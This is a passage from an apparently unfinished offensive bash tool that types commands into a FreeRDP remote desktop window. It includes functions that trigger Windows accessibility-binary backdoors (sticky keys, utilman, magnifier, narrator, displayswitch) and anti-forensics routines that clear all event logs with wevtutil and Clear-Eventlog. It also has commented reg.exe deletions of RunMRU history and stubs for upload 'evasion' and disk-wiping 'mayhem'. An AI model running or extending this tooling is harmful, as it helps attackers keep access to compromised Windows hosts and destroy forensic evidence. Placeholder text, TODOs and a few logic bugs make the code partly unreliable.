Fill in the description of the technique
EOF
    read -d '' linux_description << EOF
Fill in the description of the technique
EOF

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method

    if [[ "${action}" == "info" ]]
    then
        print_status "information" "Create Windows User Account"
        echo "${windows_description}"
    elif [[ "${action}" == "info" ]]
    then
        print_status "information" "Create Linux User Account"
        echo "${linux_description}"
    else
        print_status "error" "Invalid mode!"
    fi
    if [[ "${PLATFORM}" == "windows" ]]
    then
        echo "Windows"
    elif [[ "${PLATFORM}" == "linux" ]]
    then
        echo "Linux"
    fi
}

function sticky_keys() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        print_status "information" "Sticky Keys"
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating sethc.exe (sticky keys) backdoor..."
        print_status "information" "Pressing SHIFT key 5 times"
        for (( i=1; i<=5; i++ ))
        do
            print_status "progress" "SHIFT: ${i}"
            keyboard "shift" "custom_keystroke"
        done
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function utility_manager() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        print_status "information" "Utility Manager"
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating utilman.exe (utility manager) backdoor..."
        keyboard "Super+u" "custom_keystroke"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function magnifier() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        print_status "information" "Magnifier"
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating magnifier.exe backdoor..."
        keyboard "Super+equal" "custom_keystroke"
        keyboard "Super+minus" "custom_keystroke"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function narrator() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        print_status "information" "Narrator"
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating narrator.exe backdoor..."
        keyboard "Super+Return" "custom_keystroke"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function display_switch() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    # TODO: Print out information with commands to instruct the user both commands and cmdlet
    # Add a cleanup method
    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "Registry keys only exists on Windows operating system!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        print_status "information" "Display Switch"
        echo "${description}"
    elif [[ "${action}" == "backdoor" ]]
    then
        print_status "progress" "Activating displayswitch.exe backdoor..."
        keyboard "Super+p" "custom_keystroke"
        print_status "completed" "Backdoor activated!"
    else
        print_status "error" "Invalid mode!"
    fi
}

function persistence() {
    local persistence_method="${1}"
    local persistence_action="${2}"

    # -a, --action flag "info,backdoor". For "info" contains the execution commands
    # for both command prompt and powershell. To enumerate, persistence and cleanup
    # For "backdoor" to activate the backdoor
    # TODO: Fill in the rest of the persistence methods
    case "${persistence_method}" in
        createuser)
            create_user "${persistence_action}"
            ;;
        sethc)
            sticky_keys "${persistence_action}"
            ;;
        utilman)
            utility_manager "${persistence_action}"
            ;;
        magnifier)
            magnifier "${persistence_action}"
            ;;
        narrator)
            narrator "${persistence_action}"
            ;;
        displayswitch)
            display_switch "${persistence_action}"
            ;;
        *)
            print_status "error" "Invalid Persistence Technique!" >&2
            exit 1
            ;;
    esac
}

function window_event_log_utility() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        print_status "information" "Clear Windows Event Logs"
        echo "${description}"
    elif [[ "${action}" == "quick" ]]
    then
        execute "for /f \"tokens=*\" %1 in ('wevtutil.exe el') do wevtutil.exe cl \"%1\"" "none"
    elif [[ "${action}" == "full" ]]
    then
    # TODO: Include the wiper and then transfer it with Base64 certutil cmd terminal
        echo "not implemented"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function clear_event_log() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    if [[ "${platform}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        print_status "information" "Clear Windows Event Logs via PowerShell"
        echo "${description}"
    elif [[ "${action}" == "quick" ]]
    then
        execute "Clear-Eventlog -Log Application,Security,System -Confirm" "none"
    elif [[ "${action}" == "full" ]]
    then
    # TODO: Include the wiper and then transfer it with Base64 powershell terminal
        echo "not implemented"
    else
    # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function event_viewer() {
    local action="${1}"
    read -d '' description << EOF
Fill in the description of the technique
EOF

    if [[ "${PLATFORM}" != "windows" ]]
    then
        print_status "error" "This method is only exclusive for windows!"
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ "${action}" == "info" ]]
    then
        # TODO: Include information of this technique
        print_status "information" "Event Viewer"
        echo "${description}"
    elif [[ "${action}" == "manual" ]]
    then
        dialogue_box "eventvwr.msc"
    else
        # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function clear_registry_values() {
    # TODO: Converth these commands into powershell cmdlets
    # reg.exe delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /reg:64 /f
    # reg.exe delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Windows Search" /va /reg:64 /f
    echo ""
}

function antiforensics() {
    local antiforensics_method="${1}"
    local antiforensics_action="${2}"
    # TODO: Include features for anti-forensics also include eventvwr.msc with a dialog box

    # -a <info (display info) | execute (to execute the commands | script (to transfer script) | manual (display the commands)>
    # -p <windows | linux> -m <wevtutil | clearevent>

    # Batch script
    # Powershell script
    # Bash script
    case "${antiforensics_method}" in
        wevtutil)
            window_event_log_utility "${antiforensics_method}" "${antiforensics_action}"
            ;;
        clearevent)
            clear_event_log "${antiforensics_method}" "${antiforensics_action}"
            ;;
        eventvwr)
            event_viewer "${antiforensics_method}" "${antiforensics_action}"
            ;;
        *)
            print_status "error" "Invalid Antiforensic Technique!" >&2
            exit 1
            ;;
    esac
}

function format_disk() {
    read -d '' description << EOF
Fill in the description of the technique
EOF

    if [[ "${action}" == "info" ]]
    then
        # TODO: Include information of this technique
        print_status "information" "Format Disk"
        echo "${description}"
    elif [[ "${action}" == "diskpart" ]]
    then
        echo "diskpart.exe"
    else
        # TODO: If the mode was invalid display the available options to inform the user
        print_status "error" "Invalid mode!"
    fi
}

function mayhem() {
    local mayhem_method="${1}"
    local mayhem_action="${2}"

    echo "not implemented"
}

function usage() {
    echo "Usage:
    $(base_name ${0}) <flags>

Flags:

COMMON OPTIONS:
    -c, --command <command | file>      Specify a command or a file contains commands
                                        to execute

    -p, --platform <operating_system>   Specify the operating system (\"windows\" is
                                        set by default if not specified)

    -w, --windowname <window_name>      Specify the window name to focus on the
                                        active window (\"freerdp\" is set by default
                                        if not specified)

    -h, --help                          Display this help message

UPLOAD FILES:
    -i, --input <input_file>            Specify the local input file to transfer
    -o, --output <output_file>          Specify the remote output file to transfer

METHODS:
    -m, --method <method>               Specify a method. For command execution method
                                        \"none\" is set by default if not specified.
                                        For file transfer \"pwshb64\" is set by default
                                        if not specified. Other available methods are:
                                        \"elevate\", \"persistence\", \"antiforensics\", and
                                        \"mayhem\"

    -s, --submethod <submethod>         Specify a submethod from a method (applies
                                        with -m flag)

    -a, --action <action>               Specify an action from a method and/or
                                        submethod (applies with -m and/or -s flag)

    -e, --evasion <evasion>             Specify an evasion method for uploading files
                                        (only works for \"pwshb64\")"
    exit 1
}

function main() {
    check_dependencies

    if [[ ${#} -eq 0 ]]
    then
        usage
    fi

    # TODO: -v, --variant
    # -v <legacy | default>
    while [[ ${#} -gt 0 ]]
    do
        case ${1} in
            -c | --command)
                COMMAND="${2}"
                shift 2
                ;;
            -i | --input)
                INPUT="${2}"
                shift 2
                ;;
            -o | --output)
                OUTPUT="${2}"
                shift 2
                ;;
            -m | --method)
                METHOD="${2,,}"
                shift 2
                ;;
            -s | --submethod)
                SUBMETHOD="${2,,}"
                shift 2
                ;;
            -a | --action)
                ACTION="${2,,}"
                shift 2
                ;;
            -e | --evasion)
                EVASION="${2,,}"
                shift 2
                ;;
            -p | --platform)
                PLATFORM="${2,,}"
                shift 2
                ;;
            -w | --windowname)
                WINDOWNAME="${2}"
                shift 2
                ;;
            -h | --help)
                usage
                ;;
            *)
                echo "Invalid option: ${1}" >&2
                exit 1
                ;;
        esac
    done

    # If window name isn't specified it'll set to FreeRDP as default.
    if [[ (-z "${WINDOWNAME}" || "${WINDOWNAME,,}" == "freerdp") ]]
    then
        WINDOWNAME="FreeRDP"
    elif [[ (-n "${WINDOWNAME}" && "${WINDOWNAME,,}" != "freerdp") ]]
    then
        WINDOWNAME="${WINDOWNAME}"
    fi

    # Checks if the program exists.
    if [[ ! $(get_window_name) ]]
    then
        print_status "error" "Application name is absent or invalid window name."
        print_status "information" "Terminating program..."
        exit 1
    fi

    if [[ ! -f "${COMMAND}" && -n "${COMMAND}" ]]
    then
        # When input is string and not a file. It executes command
        if [[ -z "${METHOD}" ]]
        then
            METHOD="none"
        fi
        execute "${COMMAND}" "${METHOD}"
    elif [[ -f "${COMMAND}" ]]
    then
        # Check if a file is passed as input then execute commands
        automate "${COMMAND}"
    fi

    # When the input for selecting an operating system is empty
    # it'll choose "windows" as default.
    if [[ -z "${PLATFORM}" ]]
    then
        PLATFORM="windows"
    elif [[ "${PLATFORM}" != "windows" && "${PLATFORM}" != "linux" ]]
    then
        print_status "error" "Invalid or operating system not supported. Allowed values: 'windows' or 'linux'."
        exit 1
    fi

    if [[ -f "${INPUT}" && -n "${OUTPUT}" ]]
    then
        upload "${INPUT}" "${OUTPUT}" "${METHOD}" "${ACTION}" "${EVASION}"
    elif [[ "${METHOD}" == "elevate" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        elevate "${SUBMETHOD}" "${ACTION}"
    elif [[ "${METHOD}" == "persistence" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        persistence "${SUBMETHOD}" "${ACTION}"
    elif [[ "${METHOD}" == "antiforensics" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        antiforensics "${SUBMETHOD}" "${ACTION}"
    elif [[ "${METHOD}" == "mayhem" && -n "${SUBMETHOD}" && -n "${ACTION}" ]]
    then
        mayhem "${SUBMETHOD}" "${ACTION}"
    fi
}

main "${@}"
